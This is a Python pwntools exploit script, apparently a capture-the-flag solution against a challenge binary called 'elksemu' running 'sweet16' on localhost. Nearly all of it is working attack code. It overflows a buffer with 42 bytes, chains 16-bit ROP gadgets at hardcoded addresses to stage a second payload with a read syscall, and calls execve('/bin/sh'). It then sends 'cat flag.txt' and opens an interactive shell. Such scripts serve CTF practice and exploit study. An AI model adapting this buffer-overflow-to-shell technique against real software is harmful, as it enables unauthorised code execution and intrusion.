#!/usr/bin/env python3

from pwn import *

exe = ELF("./elksemu")
context.binary = exe
context.terminal = ["tmux", "neww", "-n", "shell"]

host, port = "localhost", 1616

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    elif args.SSH:
        return ssh(user, host)
    else:
        return process([exe.path, "./sweet16"] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

ru  = lambda *x, **y: io.recvuntil(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
rc  = lambda *x, **y: io.recv(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)

# -- Exploit goes here --


offset = b"a"*42
io = start()
rc(timeout=1)

### Gadgets ###
ax_sp = 0x2a9 # xchg ax, di; sp, bp; pop bp;pop di; pop si; ret;
pop_bp_di = 0x2ac # pop bp; pop di; pop si; ret
syscall = 0x9f # mov sp, bx; dx = sp[6]; cx = sp[4]; bx = sp[2]; int 0x80
read_sys = 0x88
main = 0x0

### Chain 1 ###
chain1 = p16(read_sys) + p16(main) + p16(0) + p16(0x2d00) + p16(200) # write the final ROP chain on 0x2d00 with a length of 200 bytes
sl(offset+chain1)
sleep(0.2)
### Chain 3 ###
chain3 = p16(1337) + p16(1337) + p16(1337) + p16(syscall) + p16(1337) + p16(0x2d00) + p16(0)+p16(0) # Call excve("/bin/sh")
sl(b"/bin/sh\x00"+chain3)
sleep(0.2)
### Chain 2 ###
chain2 = p16(pop_bp_di) + p16(0x2d08) + p16(11) +p16(1337) + p16(ax_sp)

sl(offset+chain2)
sleep(0.2)
#sleep(1)
sl(b"cat flag.txt")
io.interactive()
